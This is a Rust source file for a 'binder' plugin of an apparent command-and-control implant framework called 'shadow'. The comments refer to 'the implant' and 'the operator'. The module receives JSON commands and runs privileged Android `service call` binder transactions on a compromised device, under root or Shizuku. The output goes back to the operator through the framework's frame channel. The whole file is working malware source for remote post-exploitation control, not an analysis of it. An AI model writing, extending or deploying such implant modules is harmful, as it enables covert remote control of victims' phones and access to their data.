use shadow::module::{ShadowContext, ShadowModuleApi};
use std::os::raw::c_char;
use std::ffi::CString;
use tokio::process::Command;

static mut CTX: Option<ShadowContext> = None;

#[no_mangle]
pub extern "C" fn shadow_module_init(ctx: ShadowContext) -> i32 {
    unsafe { CTX = Some(ctx); }
    0
}

#[no_mangle]
pub extern "C" fn shadow_module_handle_cmd(payload: *const u8, len: usize) -> *mut u8 {
    let req = unsafe { std::slice::from_raw_parts(payload, len) };
    
    let response = match std::str::from_utf8(req) {
        Ok(json_str) => {
            let json_str = json_str.to_string();
            tokio::spawn(async move {
                if let Err(e) = execute_binder_call(&json_str).await {
                    send_frame(format!("{{\"error\":\"{}\"}}", e).as_bytes());
                }
            });
            "{\"status\":\"executing_binder_call\"}".to_string()
        }
        Err(_) => "{\"error\":\"invalid_utf8\"}".to_string()
    };
    
    let c_str = CString::new(response).unwrap();
    c_str.into_raw() as *mut u8
}

async fn execute_binder_call(json_str: &str) -> anyhow::Result<()> {
    let v: serde_json::Value = serde_json::from_str(json_str)?;
    let service = v.get("service").and_then(|v| v.as_str()).unwrap_or("activity");
    let code = v.get("code").and_then(|v| v.as_u64()).unwrap_or(1);
    // Optional args: string "s16", int "i32", etc.
    let args = v.get("args").and_then(|v| v.as_array());

    // Construct the `service call` command
    // Note: If the implant is running as a normal app, it won't have permission to call most services.
    // This module assumes the operator has executed it in a Shizuku or Root context via `app_process`.
    let mut cmd_args = vec!["call".to_string(), service.to_string(), code.to_string()];
    
    if let Some(arg_list) = args {
        for arg in arg_list {
            if let Some(obj) = arg.as_object() {
                if let Some(s) = obj.get("s16").and_then(|v| v.as_str()) {
                    cmd_args.push("s16".to_string());
                    cmd_args.push(s.to_string());
                } else if let Some(i) = obj.get("i32").and_then(|v| v.as_i64()) {
                    cmd_args.push("i32".to_string());
                    cmd_args.push(i.to_string());
                }
            }
        }
    }

    let output = Command::new("service")
        .args(&cmd_args)
        .output()
        .await?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    // Parse the raw hex output typical of `service call`
    // Example: Result: Parcel(00000000 00000001   '........')
    let result = format!("{{\"service\":\"{}\",\"code\":{},\"stdout\":\"{}\",\"stderr\":\"{}\"}}", 
                         service, code, stdout.trim().replace('"', "\\\"").replace('\n', "\\n"), stderr.trim().replace('"', "\\\""));
                         
    send_frame(result.as_bytes());
    
    Ok(())
}

fn send_frame(data: &[u8]) {
    unsafe {
        if let Some(ctx) = &CTX {
            (ctx.send_frame)(data.as_ptr(), data.len());
        }
    }
}

#[no_mangle]
pub extern "C" fn shadow_module_shutdown() -> i32 { 0 }

#[no_mangle]
pub static SHADOW_API: ShadowModuleApi = ShadowModuleApi {
    name: b"binder\0".as_ptr() as *const c_char,
    version: 2,
    init: shadow_module_init,
    handle_cmd: shadow_module_handle_cmd,
    shutdown: shadow_module_shutdown,
};

#[no_mangle]
pub unsafe extern "C" fn shadow_module_get_api() -> *const ShadowModuleApi {
    &SHADOW_API as *const ShadowModuleApi
}